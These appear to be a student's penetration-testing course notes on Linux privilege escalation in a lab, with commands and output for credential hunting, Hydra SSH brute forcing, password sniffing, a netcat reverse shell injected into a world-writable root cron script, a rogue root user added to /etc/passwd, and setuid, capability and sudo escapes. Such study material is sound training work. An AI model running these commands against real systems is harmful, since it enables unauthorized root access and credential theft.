Pentests are often time-constrained, so it's important to focus efforts first on low-hanging fruit.
- History files
- Environment variables
- Insecure file permissions
- Insecure system components
- Dotfiles (like *.bashrc* and *.bash_history*)

# User Trails

Environment variables can contain good information as it's how some system admins will store creds
```bash
env
	SHELL=/bin/bash
	PWD=/home/joe
	LOGNAME=joe
	XDG_SESSION_TYPE=tty
	HOME=/home/joe
	LANG=en_US.UTF-8
	...
	SCRIPT_CREDENTIALS=lab
	USER=joe
	...
```

To confirm it's a permanent variable, inspect the *.bashrc* config file
```bash
cat .bashrc
	# ~/.bashrc: executed by bash(1) for non-login shells.
	# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
	# for examples
	
	# If not running interactively, don't do anything
	case $- in
	    *i*) ;;
	      *) return;;
	esac
	
	# don't put duplicate lines or lines starting with space in the history.
	# See bash(1) for more options
	export SCRIPT_CREDENTIALS="lab"
	HISTCONTROL=ignoreboth
	...
```
	- Can confirm that the variable holding the password is exported when a user's shell is launched.


- Attempt to elevate privs with newly discovered password
```bash
su - root
	Password: 

whoami
	root
```


Let's assume that the password didn't work for the `root` user or we (for whatever reason) want to try to pivot to the `eve` user discovered during our [enumeration](17.1%20-%20PrivEsc%20Enumerating%20Linux.md#Enumerate%20all%20users)

Knowing the script creds, can attempt building a custom dictionary derived from the known password to attempt to brute force `eve`'s account.

- [crunch](Tools.md#crunch)
```bash
crunch 6 6 -t Lab%%% > wordlist
Crunch will now generate the following amount of data: 7000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000 

cat wordlist                        
	Lab000
	Lab001
	Lab002
	Lab003
	...
	Lab998
	Lab999
```
	- 6 6 - Set a minimum & maximum length to 6 characters
	- -t - Hard-code the first three chars to Lab
	- % - Follow by numeric digit

> Since an SSH server is available, we can try to attempt a [remote brute force attack via Hydra](15.1%20-%20Network%20Services%20PW%20Attacks.md#SSH%20Attack)
```bash
hydra ssh://192.168.231.214 -l eve -P wordlist
	...
	[DATA] attacking ssh://192.168.231.214:22/
	[22][ssh] host: 192.168.231.214   login: eve   password: Lab123
```

### Sudo capabilities

- Once SSH'd in as `eve`, we can verify if we're running as a privileged user by listing their sudo capabilities
```bash
sudo -l
	[sudo] password for eve: 
	Matching Defaults entries for eve on debian-privesc:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
	
	User eve may run the following commands on debian-privesc:
	    (ALL : ALL) ALL
```
	- Points that eve is an admin account

- Elevate directly to root
```bash
sudo -i

whoami
	root
```

# Service Footprints

System daemons are Linux services that are spawned at boot time to perform specific operations without any need for user interaction.
Linux servers are often configured to host numerous daemons, like SSH, web servers, and databases, to mention a few.

System admins often rely on custom daemons to execute ad-hoc tasks and they sometimes neglect security best practices.

> Unlike Windows systems, Linux can list info about higher-priv processes like the ones running inside the `root` user context.

- Use `watch` to refresh the output of our **ps** command
```bash
watch -n 5 "ps -aux | grep pass"
	Every 5.0s: ps -aux | grep pass                                                   debian-privesc: Wed May  1 14:31:19 2024

	joe       2711  0.0  0.1   6112  3004 pts/0    S+   14:31   0:00 watch -n 5 ps -aux | grep pass
	root      2721  0.0  0.0   2384   764 ?        S    14:31   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;
	root      2722  0.0  0.0   2356  1688 ?        S    14:31   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
	joe       2745  0.0  0.0   6112   652 pts/0    S+   14:31   0:00 watch -n 5 ps -aux | grep pass
	joe       2746  0.0  0.0   2384   756 pts/0    S+   14:31   0:00 sh -c ps -aux | grep pass
	joe       2748  0.0  0.0   6072   880 pts/0    S+   14:31   0:00 grep pass
```
	- Notice how the admin has configure a daemon connecting to the local system w/ eve's creds in clear text

>**NOTE**:  Setting the interval -n to 5 will pause the output long enough to copy output or grab a screenshot.
	Be careful! as if anything updates ~ the same time, you may miss it.  Best to start with -n 1 for a feel of the cadence, then change


Also important to verify whether we have rights to capture network traffic.

[**tcpdump**](OS%20Commands.md#tcpdump) is the de facto cmdline standard for packet capture, but requires admin access as it operates on raw sockets.
- Not uncommon to find IT accounts have been given access to the tool for troubleshooting purposes.

```bash
sudo tcpdump -i lo -A | grep "pass"
	[sudo] password for joe: 
	tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
	listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
	........user:root,pass:lab -
	........user:root,pass:lab -
```

# Insecure File Permissions

In order to leverage insecure file permissions, must locate an executable file that:
- Allows us write access
- Runs at an elevated privilege level.


## Cron Jobs

Since system-level scheduled jobs are executed with root user privileges and system administrators often create scripts for cron jobs with insecure permissions.

While we can view a list of all cron jobs with `ls -lah /etc/cron*`
We can also search for cron in the syslog file
```bash
grep "CRON" /var/log/syslog
	May  1 22:02:43 debian-privesc CRON[1320]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
	May  1 22:03:01 debian-privesc CRON[1346]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
	May  1 22:04:01 debian-privesc CRON[1442]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
	May  1 22:05:01 debian-privesc CRON[1561]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
	May  1 22:06:01 debian-privesc CRON[1801]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```
	- Script `user_backups.sh` executes under the context of the root user from the /home/joe/.scripts directory roughly every minute

```bash
cat .scripts/user_backups.sh 
	#!/bin/bash
	
	cp -rf /home/joe/ /var/backups/joe/

ls -l .scripts/user_backups.sh
	-rwxrwxrw- 1 root root 50 Aug 25  2022 .scripts/user_backups.sh
```
	- sh file makes a backup of joe's home folder to /var/backups/joe
	- the script's user and group is root and is read & writable by everyone


As everyone can write to it, we should be able to add in a reverse shell and get a connection as root
```bash
# Tab 1
echo >> .scripts/user_backups.sh 

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.238 5555 >/tmp/f" >> .scripts/user_backups.sh

# Tab 2
nc -nlvp 5555
	listening on [any] 5555 ...
	connect to [192.168.45.238] from (UNKNOWN) [192.168.180.214] 50330
	/bin/sh: 0: can''t access tty; job control turned off

whoami 
	root
```


## Password Authentication

Unless LDAP or AD is used, Linux keeps password hashes in the `/etc/shadow` file.
- Historically they used to be the second column of the `/etc/passwd` file.
- For backwards compatibility, if a hash is present in the  `/etc/passwd` file, it's valid and takes precedence

If we can write to `/etc/passwd`, we can create our own user with login info.

In order to craft the appropriate hash for a password, we'll need to use **openssl**

> The output of the OpenSSL _passwd_ command may vary depending on the system executing it.
> On older systems, it may default to the DES algorithm, while on some newer systems it could output the password in MD5 format.


```bash
# Craft hash - will be different each time command is run
openssl passwd w00t
	9460jNq5H41pc

# Add user and hash to /etc/passwd
echo "root2:9460jNq5H41pc:0:0:root:/root:/bin/bash" >> /etc/passwd

# su into new user
su root2 
	Password:

id
	uid=0(root) gid=0(root) groups=0(root)
```


# System Components

## Setuid Binaries and Capabilities

When a user or a system-automated script launches a process, it inherits the UID/GID of its initiating script - the real UID/GID
- When a non-privileged user needs to access a file that's owned and writable only by root (such as changing their password), eUID/eGID circumvents

eUID works when a binary has the *setuid/setgid* set.  It allows the user to work with the file under the prems of the owner/group

setuid can be configured using `chmod u+s <filename>`

One such binary is `passwd` - responsible for changing the pw for the user executing it.
```bash
# passwd perms
ls -asl /usr/bin/passwd
	64 -rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd

# Start passwd
passwd
	Changing password for joe.
	Current password:

# In another shell to analyze
ps u -C passwd
	USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
	root      4064  0.0  0.1   9364  3112 pts/0    S+   14:41   0:00 passwd

# Verify UID using PID from previous output
grep Uid /proc/4064/status
	Uid:    1000    0       0       0
```
	- Output values read:  Real UID (1000) and eUIDs


Issue is that if there's any bugs, it's easy to misuse the application for privesc

```bash
# Locate a binary with setuid
find / -perm -u=s -type f 2>/dev/null
	/usr/bin/find
	/usr/bin/chsh
	/usr/bin/fusermount
	/usr/bin/chfn
	/usr/bin/passwd
	/usr/bin/sudo
	/usr/bin/pkexec
	/usr/bin/ntfs-3g
	/usr/bin/gpasswd
	/usr/bin/newgrp
	/usr/bin/bwrap
	/usr/bin/su
	/usr/bin/umount
	/usr/bin/mount
	/usr/lib/policykit-1/polkit-agent-helper-1
	/usr/lib/xorg/Xorg.wrap
	/usr/lib/eject/dmcrypt-get-device
	/usr/lib/openssh/ssh-keysign
	/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
	/usr/lib/dbus-1.0/dbus-daemon-launch-helper
	/usr/sbin/pppd

# Exploit
find . -exec "/usr/bin/bash" -p \;
bash-5.0# id
	uid=1000(joe) gid=1000(joe) euid=0(root) groups=1000(joe)...
bash-5.0# whoami
	root
```
	- Once the *find* program searches for and finds the directory we ask it to, we can instruct it to perform any action through the *-exec* parameter.
	- -exec - Runs command following command
		- -p - *Set Builtin* parameter which prevents the effective user from being reset
		- \; - Ends command ran by exec.  Must be escaped (hence the \)
		- Other possible -exec parameters:
			- {} - The find results placeholder.  Expands command to the filename of each of the files/ directories found by find.
				- ex:find / -size 64c -exec grep -Hi base64 {} \;
			- + - Ends command ran by exec. Appends found files to end of the command so command is run only once.  More efficient than ; but results are all on one line
				- ex: find / -size 64c -exec grep -Hi base64 {} +


## Capabilities
Extra attributes that can be applied to processes, binaries, and services to assign specific privileges normally reserved for admin ops (traffic capturing, adding kernel modules, etc)
	If misconfigured can allow an attacker to elevate privs to root

Can manually enumerate target system for binaries with capabilities
```bash
/usr/sbin/getcap -r / 2>/dev/null
	/usr/bin/ping = cap_net_raw+ep
	/usr/bin/perl = cap_setuid+ep             #<--NOTE setuid capability
	/usr/bin/perl5.28.1 = cap_setuid+ep       #<--NOTE setuid capability
	/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
	/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
	- -r - Recursive search
	- +ep - Effective and permitted

As seen, two *perl* binaries stand out as they have *setuid* capabilities enabled along w/ the *+ep* flag

Using [GTFObins](https://gtfobins.github.io) we can see the cmdline we can use for exploitation
![](gtfobins_perlcapabilities.png)

```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# id
	uid=0(root) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)
# whoami
	root
```


# Abusing Sudo
- Changes the eUID of the executed command.
- In order to use **sudo**, a user needs to be a member of the sudo group.
- Custom configurations of sudo-related perms can be applied in */etc/sudoers* file
- Can use **-l** or **--list** to view allowed commands for the current user


```bash
sudo -l
	[sudo] password for joe: 
	Matching Defaults entries for joe on debian-privesc:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
	
	User joe may run the following commands on debian-privesc:
	    (ALL) /usr/bin/crontab -l, /usr/sbin/tcpdump, /usr/bin/apt-get
```
	- Only crontab -l, tcpdump, and apt-get are available


As we're only allowed to list cron jobs, it's highly unlikely we'll bet privesc through this.
Best to search GTFObins for `tcpdump` and `apt-get`

- tcpdump
![](gtfobins_tcpdumpsudo.png)

- apt-get
![](gtfobins_aptgetsudo.png)

Considering `apt-get` looks to be a bit more complex, we'll try `tcpdump` first
```bash
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $TF
chmod +x $TF

sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
	dropped privs to root
	tcpdump: listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
	Maximum file limit reached: 1
	1 packet captured
	46 packets received by filter
	0 packets dropped by kernel
	joe@debian-privesc:~$ compress_savefile: execlp(/tmp/tmp.UE1Fo7eiUj, /dev/null) failed: Permission denied
```
	- Permission denied

- Can inspect the **syslog** file for any occurrence of *tcpdump* to discover why it may have been denied
```bash
grep tcpdump /var/log/syslog
	May  2 16:09:44 debian-privesc kernel: [  594.698232] audit: type=1400 audit(1714684184.411:24): apparmor="DENIED" operation="exec" profile="/usr/sbin/tcpdump" name="/tmp/tmp.UE1Fo7eiUj" pid=2353 comm="tcpdump" requested_mask="x" denied_mask="x" fsuid=0 ouid=1000
```
	- Reveals AppArmor was triggered and denied it.


**AppArmor** is a kernel module that provides mandatory access control (MAC)
- Runs various app-specific profiles
- Enabled by default on Debian 10

> As root, can verify AppArmor's status
```bash
aa-status
	apparmor module is loaded.
	20 profiles are loaded.
	18 profiles are in enforce mode.
	   /usr/bin/evince
	   /usr/bin/evince-previewer
	   /usr/bin/evince-previewer//sanitized_helper
	   /usr/bin/evince-thumbnailer
	   /usr/bin/evince//sanitized_helper
	   /usr/bin/man
	   /usr/lib/cups/backend/cups-pdf
	   /usr/sbin/cups-browsed
	   /usr/sbin/cupsd
	   /usr/sbin/cupsd//third_party
	   /usr/sbin/tcpdump
```


As `crontab` and `tcpdump` are out (should check AppArmor first), gotta try `apt-get`
```bash
sudo apt-get changelog apt

# From within the `less` application, execute a bash shell
!/bin/sh
	Get:1 store: apt 1.8.2.3 Changelog
	Fetched 459 kB in 0s (0 B/s)
	# id
		uid=0(root) gid=0(root) groups=0(root)
```
	- this exploit works similar to SecureSet's Linux lvl 8 CTF


# Kernel Vulns

Success depends on matching the target's kernel version AND the OS flavor (Debian, Redhat, Suse, etc)  
  
First gather info about the target:  
```bash
cat /etc/issue  
	Ubuntu 16.04.4 LTS \n \l
```

Inspect kernel version & system architecture:  
```bash
uname -r  
	4.4.0-116-generic  
arch  
	x86_64
```
	- Kernel version
